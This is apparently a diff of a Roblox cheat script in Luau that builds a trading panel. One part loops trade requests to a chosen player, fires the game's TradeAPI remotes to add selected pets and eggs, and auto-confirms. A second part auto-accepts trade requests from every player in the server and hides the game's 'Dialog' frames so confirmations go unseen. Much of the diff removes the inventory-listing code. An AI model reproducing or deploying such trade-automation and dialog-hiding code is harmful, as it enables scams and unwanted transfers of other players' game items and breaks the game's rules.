@@ -390,95 +390,50 @@ local function PZSESN_fake_script() -- userInterface.Userscript
 	local script = Instance.new('LocalScript', userInterface)
 
 	local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local panel = script.Parent
+	
+	local playerList = Instance.new("ScrollingFrame")
+	playerList.Name = "PlayerList"
+	playerList.Parent = panel
+	playerList.BackgroundTransparency = 1
+	playerList.BorderSizePixel = 0
+	playerList.Position = UDim2.fromOffset(8, 8)
+	playerList.Size = UDim2.new(1, -16, 1, -16)
+	playerList.AutomaticCanvasSize = Enum.AutomaticSize.Y
+	playerList.CanvasSize = UDim2.new()
+	playerList.ScrollBarThickness = 6
+	
+	local layout = Instance.new("UIListLayout")
+	layout.Parent = playerList
+	layout.Padding = UDim.new(0, 6)
+	layout.SortOrder = Enum.SortOrder.Name
+	
+	local selectedPlayer
+	local tradeLoopRunning = false
+	local scrollingFrame = panel.Parent
+	local sendTradeButton = scrollingFrame:WaitForChild("SendTrade/Button")
+	local stopTradeButton = scrollingFrame:WaitForChild("StopTrade/Button")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local API = ReplicatedStorage:WaitForChild("API")
+	local addItemRemote = API:WaitForChild("TradeAPI/AddItemToOffer")
+	local sendTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
+	local AcceptNeg = API:WaitForChild("TradeAPI/AcceptNegotiation")
+	local ConfirmTrade = API:WaitForChild("TradeAPI/ConfirmTrade")
+	local petInterface = scrollingFrame:WaitForChild("PetInterface")
+	local selectedPets = petInterface:WaitForChild("SelectedPets")
+	local eggInterface = scrollingFrame:WaitForChild("EggInterface")
+    local selectedEggs = eggInterface:WaitForChild("SelectedEggs")
 
-local panel = script.Parent
-local scrollingFrame = panel.Parent
+	local function stopTradeLoop()
+		tradeLoopRunning = false
+	end
 
---==================================================
--- PLAYER LIST
---==================================================
-
-local playerList = Instance.new("ScrollingFrame")
-playerList.Name = "PlayerList"
-playerList.Parent = panel
-playerList.BackgroundTransparency = 1
-playerList.BorderSizePixel = 0
-playerList.Position = UDim2.fromOffset(8, 8)
-playerList.Size = UDim2.new(1, -16, 1, -16)
-playerList.AutomaticCanvasSize = Enum.AutomaticSize.Y
-playerList.CanvasSize = UDim2.new()
-playerList.ScrollBarThickness = 6
-
-local layout = Instance.new("UIListLayout")
-layout.Parent = playerList
-layout.Padding = UDim.new(0, 6)
-layout.SortOrder = Enum.SortOrder.Name
-
-local selectedPlayer
-local tradeLoopRunning = false
-
---==================================================
--- TRADE REMOTES
---==================================================
-
-local sendTradeButton = scrollingFrame:WaitForChild("SendTrade/Button")
-local stopTradeButton = scrollingFrame:WaitForChild("StopTrade/Button")
-
-local API = ReplicatedStorage:WaitForChild("API")
-
-local addItemRemote = API:WaitForChild("TradeAPI/AddItemToOffer")
-local sendTradeRemote = ReplicatedStorage:FindFirstChild(
-    "TradeAPI/SendTradeRequest",
-    true
-)
-
-local AcceptNeg = API:WaitForChild("TradeAPI/AcceptNegotiation")
-local ConfirmTrade = API:WaitForChild("TradeAPI/ConfirmTrade")
-
---==================================================
--- PET / EGG INTERFACES
---==================================================
-
-local petInterface = scrollingFrame:WaitForChild("PetInterface")
-local eggInterface = scrollingFrame:WaitForChild("EggInterface")
-
--- These are created below if they don't already exist.
-local selectedPets = petInterface:FindFirstChild("SelectedPets")
-if not selectedPets then
-    selectedPets = Instance.new("Folder")
-    selectedPets.Name = "SelectedPets"
-    selectedPets.Parent = petInterface
-end
-
-local selectedEggs = eggInterface:FindFirstChild("SelectedEggs")
-if not selectedEggs then
-    selectedEggs = Instance.new("Folder")
-    selectedEggs.Name = "SelectedEggs"
-    selectedEggs.Parent = eggInterface
-end
-
---==================================================
--- STOP TRADE
---==================================================
-
-local function stopTradeLoop()
-    tradeLoopRunning = false
-end
-
---==================================================
--- START TRADE LOOP
---==================================================
-
-local function startTradeLoop()
-
+	local function startTradeLoop()
     if tradeLoopRunning then
         return
     end
 
-    if not sendTradeRemote
-        or not sendTradeRemote:IsA("RemoteEvent") then
-
+    if not sendTradeRemote or not sendTradeRemote:IsA("RemoteEvent") then
         warn("TradeAPI/SendTradeRequest was not found")
         return
     end
@@ -491,1095 +446,205 @@ local function startTradeLoop()
     tradeLoopRunning = true
 
     task.spawn(function()
-
         while tradeLoopRunning do
-
             local targetPlayer = selectedPlayer
 
-            if not targetPlayer
-                or targetPlayer.Parent ~= Players then
-
+            if not targetPlayer or targetPlayer.Parent ~= Players then
                 stopTradeLoop()
                 break
             end
 
-            -- Send trade request
+            -- 1. Send trade request
             pcall(function()
                 sendTradeRemote:FireServer(targetPlayer)
             end)
 
-            -- Wait for trade window
+            -- 2. Wait for trade window
             task.wait(2)
 
             if not tradeLoopRunning then
                 break
             end
 
-            --==================================================
-            -- ADD ALL SELECTED PETS IMMEDIATELY
-            --==================================================
-
+            -- 3. Add ALL selected pets immediately
+			local addedPetCount = 0
             for _, petId in ipairs(selectedPets:GetChildren()) do
-
-                if petId:IsA("StringValue")
-                    and petId.Value ~= "" then
-
-                    pcall(function()
+                if petId:IsA("StringValue") and petId.Value ~= "" then
+					local added = pcall(function()
                         addItemRemote:FireServer(petId.Value)
                     end)
+					if added then
+						addedPetCount += 1
+					end
                 end
             end
 
-            --==================================================
-            -- ADD ALL SELECTED EGGS IMMEDIATELY
-            --==================================================
-
+            -- 4. Add ALL selected eggs immediately
             for _, eggId in ipairs(selectedEggs:GetChildren()) do
-
-                if eggId:IsA("StringValue")
-                    and eggId.Value ~= "" then
-
+                if eggId:IsA("StringValue") and eggId.Value ~= "" then
                     pcall(function()
                         addItemRemote:FireServer(eggId.Value)
                     end)
                 end
             end
 
-            -- Give server time to register the offer
+            -- 5. Give server time to register the offer
             task.wait(1)
 
             if not tradeLoopRunning then
                 break
             end
 
-            -- Accept negotiation
-            pcall(function()
-                AcceptNeg:FireServer()
-            end)
+			if addedPetCount == 18 then
+				-- 6. Accept
+				pcall(function()
+					AcceptNeg:FireServer()
+				end)
 
-            task.wait(0.5)
+				task.wait(0.5)
 
-            if not tradeLoopRunning then
-                break
-            end
+				if not tradeLoopRunning then
+					break
+				end
 
-            -- Confirm trade
-            pcall(function()
-                ConfirmTrade:FireServer()
-            end)
+				-- 7. Confirm
+				pcall(function()
+					ConfirmTrade:FireServer()
+				end)
+			end
 
-            -- Wait until current trade is finished
-            -- before starting the next one.
+            -- 8. IMPORTANT:
+            -- Wait for the current trade to completely finish
+            -- before sending the next trade request.
             task.wait(2)
         end
     end)
 end
 
-sendTradeButton.Activated:Connect(startTradeLoop)
-stopTradeButton.Activated:Connect(stopTradeLoop)
+	sendTradeButton.Activated:Connect(startTradeLoop)
+	stopTradeButton.Activated:Connect(stopTradeLoop)
+	
+	local function addPlayer(player)
+		if player == Players.LocalPlayer then
+			return
+		end
 
---==================================================
--- PLAYER BUTTON
---==================================================
-
-local function addPlayer(player)
-
-    if player == Players.LocalPlayer then
-        return
-    end
-
-    local button = Instance.new("TextButton")
-
-    button.Name = tostring(player.UserId)
-    button.Parent = playerList
-
-    button.Size = UDim2.new(1, -6, 0, 32)
-
-    button.BackgroundColor3 =
-        Color3.fromRGB(45, 45, 45)
-
-    button.BorderSizePixel = 0
-
-    button.Font = Enum.Font.SourceSansBold
-    button.Text = player.Name
-    button.TextColor3 = Color3.new(1, 1, 1)
-    button.TextSize = 17
-
-    Instance.new(
-        "UICorner",
-        button
-    ).CornerRadius = UDim.new(0, 6)
-
-    button.Activated:Connect(function()
-
-        selectedPlayer = player
-
-        for _, item in playerList:GetChildren() do
-
-            if item:IsA("TextButton") then
-                item.BackgroundColor3 =
-                    Color3.fromRGB(45, 45, 45)
-            end
-        end
-
-        button.BackgroundColor3 =
-            Color3.fromRGB(158, 0, 158)
-
-        print(
-            "Selected player:",
-            selectedPlayer.Name
-        )
-    end)
+		local button = Instance.new("TextButton")
+		button.Name = tostring(player.UserId)
+		button.Parent = playerList
+		button.Size = UDim2.new(1, -6, 0, 32)
+		button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+		button.BorderSizePixel = 0
+		button.Font = Enum.Font.SourceSansBold
+		button.Text = player.Name
+		button.TextColor3 = Color3.new(1, 1, 1)
+		button.TextSize = 17
+	
+		Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
+	
+		button.Activated:Connect(function()
+			selectedPlayer = player
+	
+			for _, item in playerList:GetChildren() do
+				if item:IsA("TextButton") then
+					item.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+				end
+			end
+	
+			button.BackgroundColor3 = Color3.fromRGB(158, 0, 158)
+			print("Selected player:", selectedPlayer.Name)
+		end)
+	end
+	
+	for _, player in Players:GetPlayers() do
+		addPlayer(player)
+	end
+	
+	Players.PlayerAdded:Connect(addPlayer)
+	
+	Players.PlayerRemoving:Connect(function(player)
+		local button = playerList:FindFirstChild(tostring(player.UserId))
+		if button then
+			button:Destroy()
+		end
+	
+		if selectedPlayer == player then
+			selectedPlayer = nil
+		end
+	end)
 end
+coroutine.wrap(PZSESN_fake_script)()
 
-for _, player in Players:GetPlayers() do
-    addPlayer(player)
+local function ZEQSNX_fake_script() -- SwitchButton.SwitchScript 
+	local script = Instance.new('LocalScript', SwitchButton)
+
+	local button = script.Parent
+	local circle = button:WaitForChild("Circle")
+	local Players = game:GetService("Players")
+	local LocalPlayer = Players.LocalPlayer
+	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local API = ReplicatedStorage:WaitForChild("API")
+	local tradeFunction = API:WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
+	local acceptNegotiation = API:WaitForChild("TradeAPI/AcceptNegotiation")
+	local confirmTrade = API:WaitForChild("TradeAPI/ConfirmTrade")
+	local autoAcceptEnabled = false
+	local runId = 0
+
+	framesToHide = {Dialog = true}
+
+	circle.Position = UDim2.new(0, 0, 0.012, 0)
+	circle.BackgroundColor3 = Color3.fromRGB(132, 0, 132)
+
+	button.Activated:Connect(function()
+		autoAcceptEnabled = not autoAcceptEnabled
+		runId += 1
+		local currentRunId = runId
+
+		if autoAcceptEnabled then
+			circle.Position = UDim2.new(0.47, 0, 0.012, 0)
+			circle.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
+
+			task.spawn(function()
+				while autoAcceptEnabled and currentRunId == runId do
+					for _, targetPlayer in ipairs(Players:GetPlayers()) do
+						if not autoAcceptEnabled or currentRunId ~= runId then
+							break
+						end
+
+						if targetPlayer ~= Players.LocalPlayer then
+							pcall(function()
+								tradeFunction:InvokeServer(targetPlayer, true)
+							end)
+						end
+					end
+
+					pcall(function()
+						acceptNegotiation:FireServer()
+						confirmTrade:FireServer()
+					end)
+					task.wait(2)
+				end
+			end)
+
+		task.spawn(function()
+			while autoAcceptEnabled and currentRunId == runId do
+				for _, gui in ipairs(PlayerGui:GetDescendants()) do
+					if gui:IsA("Frame") and framesToHide[gui.Name] and gui.Visible then
+						gui.Visible = false
+						print("Successfully hid frame: " .. gui:GetFullName())
+					end
+				end
+
+				task.wait(2)
+			end
+		end)
+		else
+			circle.Position = UDim2.new(0, 0, 0.012, 0)
+			circle.BackgroundColor3 = Color3.fromRGB(132, 0, 132)
+		end
+	end)
 end
-
-Players.PlayerAdded:Connect(addPlayer)
-
-Players.PlayerRemoving:Connect(function(player)
-
-    local button =
-        playerList:FindFirstChild(
-            tostring(player.UserId)
-        )
-
-    if button then
-        button:Destroy()
-    end
-
-    if selectedPlayer == player then
-        selectedPlayer = nil
-    end
-end)
-
---==================================================
--- CLIENT DATA
---==================================================
-
-local successClientData, ClientData = pcall(function()
-
-    return require(
-        ReplicatedStorage
-            :WaitForChild("ClientModules")
-            :WaitForChild("Core")
-            :WaitForChild("ClientData")
-    )
-end)
-
-local KindDB = require(
-    ReplicatedStorage
-        :WaitForChild("ClientDB")
-        :WaitForChild("Inventory")
-        :WaitForChild("KindDB")
-)
-
---==================================================
--- PET INTERFACE
---==================================================
-
-local petRefreshButton =
-    scrollingFrame:WaitForChild("RefreshPet/Button")
-
-local petList = Instance.new("ScrollingFrame")
-
-petList.Name = "PetList"
-petList.Parent = petInterface
-
-petList.BackgroundTransparency = 1
-petList.BorderSizePixel = 0
-
-petList.Position =
-    UDim2.fromOffset(8, 8)
-
-petList.Size =
-    UDim2.new(1, -16, 1, -16)
-
-petList.AutomaticCanvasSize =
-    Enum.AutomaticSize.Y
-
-petList.CanvasSize = UDim2.new()
-petList.ScrollBarThickness = 6
-
-local petLayout = Instance.new("UIListLayout")
-
-petLayout.Parent = petList
-petLayout.Padding = UDim.new(0, 5)
-petLayout.SortOrder = Enum.SortOrder.LayoutOrder
-
-local selectedPetGroups = {}
-
---==================================================
--- PET NAME
---==================================================
-
-local function removeEventPrefix(displayName)
-
-    local cleanedName =
-        tostring(displayName):gsub(
-            "^[%a%s_%-]+%d%d%d%d[%s_%-]+",
-            ""
-        )
-
-    return cleanedName
-        :gsub("^%s+", "")
-        :gsub("%s+$", "")
-end
-
-local function capitalizeWords(displayName)
-
-    return displayName:gsub(
-        "(%S+)",
-        function(word)
-
-            return word:sub(1, 1):upper()
-                .. word:sub(2):lower()
-        end
-    )
-end
-
-local function getPetDisplayName(itemData)
-
-    local kind =
-        tostring(itemData.kind or "")
-
-    local kindData =
-        KindDB[kind]
-
-    -- Use actual KindDB name
-    if kindData
-        and kindData.name
-        and kindData.name ~= "" then
-
-        return tostring(kindData.name)
-    end
-
-    -- Fallback
-    local properties =
-        itemData.properties or {}
-
-    local displayName =
-        properties.name
-        or properties.custom_name
-        or properties.display_name
-        or itemData.display_name
-        or itemData.displayName
-        or itemData.name
-        or kind
-
-    if displayName
-        and displayName ~= "" then
-
-        local cleanedName =
-            removeEventPrefix(displayName)
-
-        if cleanedName ~= "" then
-            return capitalizeWords(cleanedName)
-        end
-    end
-
-    return capitalizeWords(
-        removeEventPrefix(
-            kind:gsub("[_%-]", " ")
-        )
-    )
-end
-
---==================================================
--- PET FORM
---==================================================
-
-local function getForm(itemData)
-
-    local properties =
-        itemData.properties or {}
-
-    if properties.mega_neon then
-        return "Mega"
-
-    elseif properties.neon then
-        return "Neon"
-    end
-
-    return "Normal"
-end
-
-local formOrder = {
-    Mega = 1,
-    Neon = 2,
-    Normal = 3,
-}
-
---==================================================
--- IS PET
---==================================================
-
-local function isPet(itemData)
-
-    if not itemData then
-        return false
-    end
-
-    local kind =
-        tostring(itemData.kind or "")
-
-    local kindData =
-        KindDB[kind]
-
-    if kindData then
-
-        -- Never show eggs as pets
-        if kindData.is_egg == true then
-            return false
-        end
-
-        local category =
-            string.lower(
-                tostring(kindData.category or "")
-            )
-
-        if category == "pets" then
-            return true
-        end
-    end
-
-    -- Fallback
-    if string.find(
-        string.lower(kind),
-        "egg",
-        1,
-        true
-    ) then
-        return false
-    end
-
-    return true
-end
-
---==================================================
--- PRACTICE DOG
---==================================================
-
-local function isPracticeDog(itemData)
-
-    local properties =
-        itemData.properties or {}
-
-    local kind =
-        string.lower(
-            tostring(itemData.kind or "")
-        )
-
-    local displayName =
-        string.lower(
-            tostring(
-                properties.name
-                or properties.custom_name
-                or properties.display_name
-                or itemData.display_name
-                or itemData.displayName
-                or itemData.name
-                or ""
-            )
-        )
-
-    return kind == "practice_dog"
-        or string.find(
-            kind,
-            "practice_dog",
-            1,
-            true
-        ) ~= nil
-        or string.find(
-            displayName,
-            "practice dog",
-            1,
-            true
-        ) ~= nil
-end
-
---==================================================
--- CLEAR PET LIST
---==================================================
-
-local function clearPetList()
-
-    for _, child in ipairs(
-        petList:GetChildren()
-    ) do
-
-        if child:IsA("TextButton") then
-            child:Destroy()
-        end
-    end
-
-    selectedPetGroups = {}
-    selectedPets:ClearAllChildren()
-end
-
---==================================================
--- SYNC SELECTED PETS
---==================================================
-
-local function syncSelectedPets()
-
-    selectedPets:ClearAllChildren()
-
-    local selectedIndex = 0
-
-    for group in pairs(selectedPetGroups) do
-
-        for index = 1,
-            math.min(
-                #group.uniqueIds,
-                18
-            ) do
-
-            selectedIndex += 1
-
-            local petId =
-                Instance.new("StringValue")
-
-            petId.Name =
-                "Pet_" .. selectedIndex
-
-            petId.Value =
-                tostring(
-                    group.uniqueIds[index]
-                )
-
-            petId.Parent = selectedPets
-        end
-    end
-end
-
---==================================================
--- REFRESH PETS
---==================================================
-
-local function refreshPets()
-
-    clearPetList()
-
-    if not successClientData
-        or not ClientData then
-        return
-    end
-
-    local dataStore =
-        ClientData.get_data()
-
-    local playerData =
-        dataStore
-        and (
-            dataStore[
-                Players.LocalPlayer
-            ]
-            or dataStore[
-                Players.LocalPlayer.Name
-            ]
-        )
-
-    local pets =
-        playerData
-        and playerData.inventory
-        and playerData.inventory.pets
-
-    if not pets then
-        return
-    end
-
-    local groupedPets = {}
-
-    for uniqueId, itemData in pairs(pets) do
-
-        if itemData
-            and isPet(itemData)
-            and not isPracticeDog(itemData) then
-
-            local displayName =
-                getPetDisplayName(itemData)
-
-            local form =
-                getForm(itemData)
-
-            local key =
-                displayName .. "|" .. form
-
-            local group =
-                groupedPets[key]
-
-            if not group then
-
-                group = {
-                    displayName = displayName,
-                    form = form,
-                    uniqueIds = {}
-                }
-
-                groupedPets[key] = group
-            end
-
-            table.insert(
-                group.uniqueIds,
-                uniqueId
-            )
-        end
-    end
-
-    local groups = {}
-
-    for _, group in pairs(groupedPets) do
-        table.insert(groups, group)
-    end
-
-    table.sort(
-        groups,
-        function(left, right)
-
-            local leftOrder =
-                formOrder[left.form] or 4
-
-            local rightOrder =
-                formOrder[right.form] or 4
-
-            if leftOrder == rightOrder then
-                return left.displayName
-                    < right.displayName
-            end
-
-            return leftOrder < rightOrder
-        end
-    )
-
-    for groupIndex, group in ipairs(groups) do
-
-        local button =
-            Instance.new("TextButton")
-
-        button.Name =
-            group.displayName
-            .. "_"
-            .. group.form
-
-        button.Parent = petList
-
-        button.LayoutOrder =
-            (formOrder[group.form] or 4)
-            * 100000
-            + groupIndex
-
-        button.Size =
-            UDim2.new(1, -6, 0, 32)
-
-        button.BackgroundColor3 =
-            Color3.fromRGB(45, 45, 45)
-
-        button.BorderSizePixel = 0
-
-        button.Font =
-            Enum.Font.SourceSansBold
-
-        button.Text =
-            string.format(
-                "%s %s ×%d",
-                group.form,
-                group.displayName,
-                #group.uniqueIds
-            )
-
-        button.TextColor3 =
-            Color3.new(1, 1, 1)
-
-        button.TextSize = 16
-
-        button.TextXAlignment =
-            Enum.TextXAlignment.Center
-
-        button.AutoButtonColor = true
-
-        Instance.new(
-            "UICorner",
-            button
-        ).CornerRadius =
-            UDim.new(0, 6)
-
-        button.Activated:Connect(
-            function()
-
-                if selectedPetGroups[group] then
-
-                    selectedPetGroups[group] = nil
-
-                    button.BackgroundColor3 =
-                        Color3.fromRGB(
-                            45,
-                            45,
-                            45
-                        )
-
-                    print(
-                        "Deselected pet:",
-                        button.Text
-                    )
-
-                else
-
-                    selectedPetGroups[group] = true
-
-                    button.BackgroundColor3 =
-                        Color3.fromRGB(
-                            158,
-                            0,
-                            158
-                        )
-
-                    print(
-                        "Selected pet:",
-                        button.Text
-                    )
-                end
-
-                syncSelectedPets()
-            end
-        )
-    end
-end
-
-petRefreshButton.Activated:Connect(
-    refreshPets
-)
-
-refreshPets()
-
---==================================================
--- EGG INTERFACE
---==================================================
-
-local eggRefreshButton =
-    scrollingFrame:WaitForChild("RefreshEgg/Button")
-
-local eggList =
-    Instance.new("ScrollingFrame")
-
-eggList.Name = "EggList"
-eggList.Parent = eggInterface
-
-eggList.BackgroundTransparency = 1
-eggList.BorderSizePixel = 0
-
-eggList.Position =
-    UDim2.fromOffset(8, 8)
-
-eggList.Size =
-    UDim2.new(1, -16, 1, -16)
-
-eggList.AutomaticCanvasSize =
-    Enum.AutomaticSize.Y
-
-eggList.CanvasSize = UDim2.new()
-eggList.ScrollBarThickness = 6
-
-local eggLayout =
-    Instance.new("UIListLayout")
-
-eggLayout.Parent = eggList
-eggLayout.Padding = UDim.new(0, 5)
-eggLayout.SortOrder =
-    Enum.SortOrder.LayoutOrder
-
-local selectedEggGroups = {}
-
---==================================================
--- EGG NAME
---==================================================
-
-local function removeEggPrefix(displayName)
-
-    local text =
-        tostring(displayName)
-
-    text =
-        text:gsub(
-            "[_%-]",
-            " "
-        )
-
-    text =
-        text:gsub(
-            "%d%d%d%d",
-            ""
-        )
-
-    text =
-        text:gsub(
-            "%s+",
-            " "
-        )
-
-    text =
-        text:gsub(
-            "^%s+",
-            ""
-        )
-
-    text =
-        text:gsub(
-            "%s+$",
-            ""
-        )
-
-    return text
-end
-
-local function capitalizeEggWords(displayName)
-
-    local text =
-        displayName:gsub(
-            "(%S+)",
-            function(word)
-
-                return word:sub(1, 1):upper()
-                    .. word:sub(2):lower()
-            end
-        )
-
-    -- Remove duplicate words
-    text =
-        text:gsub(
-            "(%a+)%s+%1",
-            "%1"
-        )
-
-    return text
-end
-
-local function getEggDisplayName(itemData)
-
-    local properties =
-        itemData.properties or {}
-
-    local displayName =
-        properties.name
-        or properties.custom_name
-        or properties.display_name
-        or itemData.display_name
-        or itemData.displayName
-        or itemData.name
-        or itemData.kind
-        or "Unknown egg"
-
-    local kind =
-        tostring(itemData.kind or "")
-
-    -- pet_recycler_YYYY_<egg>
-    local recyclerEgg =
-        kind:match(
-            "^pet_recycler_%d+_(.+)$"
-        )
-
-    if recyclerEgg then
-        displayName = recyclerEgg
-    end
-
-    local cleanedName =
-        removeEggPrefix(displayName)
-
-    return capitalizeEggWords(
-        cleanedName
-    )
-end
-
---==================================================
--- IS EGG
---==================================================
-
-local function isEgg(itemData)
-
-    if not itemData then
-        return false
-    end
-
-    local kind =
-        tostring(itemData.kind or "")
-
-    local lowerKind =
-        string.lower(kind)
-
-    -- Exclude basic_egg_2022 pet entries
-    if string.find(
-        lowerKind,
-        "^basic_egg_2022_",
-        1
-    ) then
-        return false
-    end
-
-    local kindData =
-        KindDB[kind]
-
-    if kindData then
-
-        if kindData.is_egg == true then
-            return true
-        end
-
-        local category =
-            string.lower(
-                tostring(
-                    kindData.category or ""
-                )
-            )
-
-        if category == "egg"
-            or category == "eggs" then
-
-            return true
-        end
-    end
-
-    -- Fallback
-    return string.find(
-        lowerKind,
-        "egg",
-        1,
-        true
-    ) ~= nil
-end
-
---==================================================
--- CLEAR EGGS
---==================================================
-
-local function clearEggList()
-
-    for _, child in ipairs(
-        eggList:GetChildren()
-    ) do
-
-        if child:IsA("TextButton") then
-            child:Destroy()
-        end
-    end
-
-    selectedEggGroups = {}
-    selectedEggs:ClearAllChildren()
-end
-
---==================================================
--- SYNC SELECTED EGGS
---==================================================
-
-local function syncSelectedEggs()
-
-    selectedEggs:ClearAllChildren()
-
-    local selectedIndex = 0
-
-    for group in pairs(selectedEggGroups) do
-
-        for index = 1,
-            math.min(
-                #group.uniqueIds,
-                18
-            ) do
-
-            selectedIndex += 1
-
-            local eggId =
-                Instance.new("StringValue")
-
-            eggId.Name =
-                "Egg_" .. selectedIndex
-
-            eggId.Value =
-                tostring(
-                    group.uniqueIds[index]
-                )
-
-            eggId.Parent = selectedEggs
-        end
-    end
-end
-
---==================================================
--- REFRESH EGGS
---==================================================
-
-local function refreshEggs()
-
-    clearEggList()
-
-    if not successClientData
-        or not ClientData then
-        return
-    end
-
-    local dataStore =
-        ClientData.get_data()
-
-    local playerData =
-        dataStore
-        and (
-            dataStore[
-                Players.LocalPlayer
-            ]
-            or dataStore[
-                Players.LocalPlayer.Name
-            ]
-        )
-
-    local pets =
-        playerData
-        and playerData.inventory
-        and playerData.inventory.pets
-
-    if not pets then
-        return
-    end
-
-    local groupedEggs = {}
-
-    for uniqueId, itemData in pairs(pets) do
-
-        if itemData
-            and isEgg(itemData) then
-
-            local displayName =
-                getEggDisplayName(itemData)
-
-            local group =
-                groupedEggs[displayName]
-
-            if not group then
-
-                group = {
-                    displayName = displayName,
-                    uniqueIds = {}
-                }
-
-                groupedEggs[displayName] =
-                    group
-            end
-
-            table.insert(
-                group.uniqueIds,
-                uniqueId
-            )
-        end
-    end
-
-    local groups = {}
-
-    for _, group in pairs(groupedEggs) do
-        table.insert(groups, group)
-    end
-
-    table.sort(
-        groups,
-        function(left, right)
-            return left.displayName
-                < right.displayName
-        end
-    )
-
-    for groupIndex, group in ipairs(groups) do
-
-        local button =
-            Instance.new("TextButton")
-
-        button.Name =
-            group.displayName
-
-        button.Parent = eggList
-
-        button.LayoutOrder =
-            groupIndex
-
-        button.Size =
-            UDim2.new(1, -6, 0, 32)
-
-        button.BackgroundColor3 =
-            Color3.fromRGB(45, 45, 45)
-
-        button.BorderSizePixel = 0
-
-        button.Font =
-            Enum.Font.SourceSansBold
-
-        button.Text =
-            string.format(
-                "%s ×%d",
-                group.displayName,
-                #group.uniqueIds
-            )
-
-        button.TextColor3 =
-            Color3.new(1, 1, 1)
-
-        button.TextSize = 16
-
-        button.TextXAlignment =
-            Enum.TextXAlignment.Center
-
-        button.AutoButtonColor = true
-
-        Instance.new(
-            "UICorner",
-            button
-        ).CornerRadius =
-            UDim.new(0, 6)
-
-        button.Activated:Connect(
-            function()
-
-                if selectedEggGroups[group] then
-
-                    selectedEggGroups[group] =
-                        nil
-
-                    button.BackgroundColor3 =
-                        Color3.fromRGB(
-                            45,
-                            45,
-                            45
-                        )
-
-                    print(
-                        "Deselected egg:",
-                        button.Text
-                    )
-
-                else
-
-                    selectedEggGroups[group] =
-                        true
-
-                    button.BackgroundColor3 =
-                        Color3.fromRGB(
-                            158,
-                            0,
-                            158
-                        )
-
-                    print(
-                        "Selected egg:",
-                        button.Text
-                    )
-                end
-
-                syncSelectedEggs()
-            end
-        )
-    end
-end
-
-eggRefreshButton.Activated:Connect(
-    refreshEggs
-)
-
-refreshEggs()
 coroutine.wrap(ZEQSNX_fake_script)()
 
 -- FULLY UPDATED EGG SCRIPT (Cleans underscores, years, and duplicate 'egg' blocks)
